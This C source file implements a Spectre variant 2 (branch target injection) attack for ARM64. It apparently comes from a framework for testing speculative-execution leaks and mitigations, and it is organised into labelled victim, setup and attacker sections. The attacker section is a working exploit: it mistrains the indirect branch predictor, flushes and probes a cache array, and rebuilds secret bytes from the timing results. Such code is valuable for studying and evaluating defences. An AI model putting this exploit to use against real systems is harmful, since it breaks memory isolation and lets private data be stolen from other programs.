#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <inttypes.h>

#include "config.h"

#if VARIANT == 2

#include "cache.h"
#include "timing.h"
#include "spectre.h"


// --------- VICTIM CODE -----------

void (**attack)(int);


// array accessed by victim depending on value read relative to array1.
char * array2 = NULL;

char* secret;
char* dummy;

// function to execute during misprediction with index to leak
// (is invoked during training, but on index that is not interesting)
void secret_fun(int offset){
    int shift = (offset % OFFSETS_PER_BYTE) * BITS;
    size_t index = offset / OFFSETS_PER_BYTE;
    memory_access(&array2[((secret[index] >> shift) & (VALUES - 1)) * ENTRY_SIZE]); 
}

// function architecturally invoked with index to leak
// (is invoked on index that is interesting, but this function doesn't leak interesting information)
void dummy_fun(int offset){
    int shift = (offset % OFFSETS_PER_BYTE) * BITS;
    size_t index = offset / OFFSETS_PER_BYTE;
    memory_access(&array2[((dummy[0] >> shift) & (VALUES - 1)) * ENTRY_SIZE]); 
}

// victim function.
void victim(void(**func)(int), size_t offset){
    asm volatile(
      "MOV x0, %[off]\n"
      "LDR x1, [%[func_ptr]]\n"
      MITIGATION_ASM "\n"
      "BLR x1\n"
    :
    : [off] "r" (offset), [func_ptr] "p" (func)
    : "x0", "x1", "x30");
}


// --------- SETUP CODE -----------

// cache removal contexts for array2
cache_ctx_t * array2_ctx = NULL;

// offset used for training (part of nullbyte of public data)
size_t training_offset;

int setup(char* public_data, char* secret_data){
    if(!array2) {
        array2 = malloc(ENTRY_SIZE * VALUES);    
    }
    if(!array2){
        fprintf(stderr, "malloc of array2 with size %d failed (%d entries of size %d)\n", ENTRY_SIZE * VALUES, VALUES, ENTRY_SIZE);
        return 1;
    }
    
    secret = malloc(strlen(secret_data) + 1);
    dummy = malloc(1);
    dummy[0] = 0;
   
    strcpy(secret, secret_data);
    attack = malloc(sizeof(void*));
    
    if(!array2_ctx){
        array2_ctx = malloc(sizeof(cache_ctx_t) * (VALUES + 1 /* attack */));
        
        if(!array2_ctx){
            fprintf(stderr, "malloc of array2_ctx with size %zu failed\n", sizeof(cache_ctx_t) * (VALUES + 1 /* array_size */));
            free(array2);
            array2 = NULL;
            free(attack);
            attack = NULL;
            return 1;
        }
        
        for(int i = 0; i < VALUES; i++){
            array2_ctx[i] = cache_remove_prepare(&array2[i * ENTRY_SIZE]);
        }
        
        array2_ctx[VALUES] = cache_remove_prepare((char*)(void*)attack);
    }
    
    training_offset = strlen(secret) * OFFSETS_PER_BYTE; /* train on nullbyte */
    
    return 0;
}

// --------- ATTACKER CODE -----------

int leakValue(size_t leak_offset){
    // array used to record amount of cache hits for each entry of array2
    static int cache_hits[VALUES];
    for(int i = 0; i < VALUES; i++){
        cache_hits[i] = 0;
    }
   
    /* 
     * collect data
     */
     
    for(int iteration = 0; iteration < ITERATIONS; iteration++){ // do ITERATIONS measurements
   
        // cache_remove(array2)
        for(int i = 0; i < VALUES; i++){
            cache_remove(array2_ctx[i]);
        }
   
        // make sure everything is really removed from cache
        memory_fence();
    
        // mistrain + mispredict indirect call
     
        for(int i = VICTIM_CALLS; i >= 0; i--){ // do VICTIM_CALLS calls to the victim function (per measurement)
            
            // training or misprediction
            // this is leak_offset every TRAINING + 1 iterations and training_offset otherwise
            // we try to avoid branches, so it is written that way.
            size_t x = (!(i % (TRAINING + 1))) * (leak_offset - training_offset) + training_offset;
            // function to call. On training this is secret_fun (but with training_offset), 
            //  on misprediction this is dummy_fun (but with leak_offset)
            *attack = (void*)((!(i % (TRAINING + 1))) * ((uint64_t)(void*)dummy_fun - (uint64_t)(void*)secret_fun) + (uint64_t)(void*)secret_fun);
             
            // remove attack from cache
            cache_remove(array2_ctx[VALUES]);
            
            // call to vulnerable function.
            // Either training (call to victim with uniteresting index) or attack (call to dummy with interesting index) call.
            // If this is an attack call and the mistraining was successful, an entry of array2 will be cached
            //  directly dependend on the entry in array1 we want to leak!
            victim(attack, x);
            
        }
        
        // measurement
        
        // measure access time to each entry in array2.
        // increment cache_hits at the corresponding position on cache hit.
        uint64_t time;
        #if VERBOSITY > 2
            printf("timings for offset %zu:\n", leak_offset);
        #endif /* VERBOSITY */
        
        for(int i = 0; i < VALUES; i++){ // for each offset in array2
            // measure time
            time = probe(&array2[i * ENTRY_SIZE]);
            #if VERBOSITY > 2
                printf("%d: %" PRId64 "\n", i, time);
            #endif /* VERBOSITY */
            // increment cache_hits on cache hit
            cache_hits[i] += (time < THRESHOLD) && time; // && time makes sure the time wasn't 0 (0 = the timer is not running)
        }
        
        #if VERBOSITY > 2
            fflush(stdout);
        #endif /* VERBOSITY */
    }
    
    /*
     * interpret collected data
     */
    #if VERBOSITY > 1
        printf("cache hits for index %zu:\n", leak_offset);
        for(int i = 0; i < VALUES; i++){
            printf("%d: %d\n", i, cache_hits[i]);
        }
    #endif /* VERBOSITY */
    
    // best offset
    // note: if we don't find a better one, it will stay 0
    int best = 0;
    // amount of cache hits for best offset
    int best_count = 0;
 
    // check if there is a better offset than 0
    for(int i = 1; i < VALUES; i++){ // for each entry of cache_hits excluding entry 0
        // if this offset has more cache hits than the current best, it becomes the new best
        if(cache_hits[i] > best_count){
            best = i;
            best_count = cache_hits[i];
        }
    }
    
    // return offset of array2 with most cache hits 
    // (should be the value read from out-of-bound access to array1 during mis-speculation)
    return best;
}

int leakByte(size_t leak_index){
    size_t leak_offset = leak_index * OFFSETS_PER_BYTE;
    
    // leak all indices that make up byte and reconstruct byte
    int result = 0;
    for(int i = OFFSETS_PER_BYTE - 1; i >= 0; i--){
        result <<= BITS;
        result |= leakValue(leak_offset + i);
    }
    
    // return reconstructed byte
    return result;
}

#endif /* VARIANT == 2 */

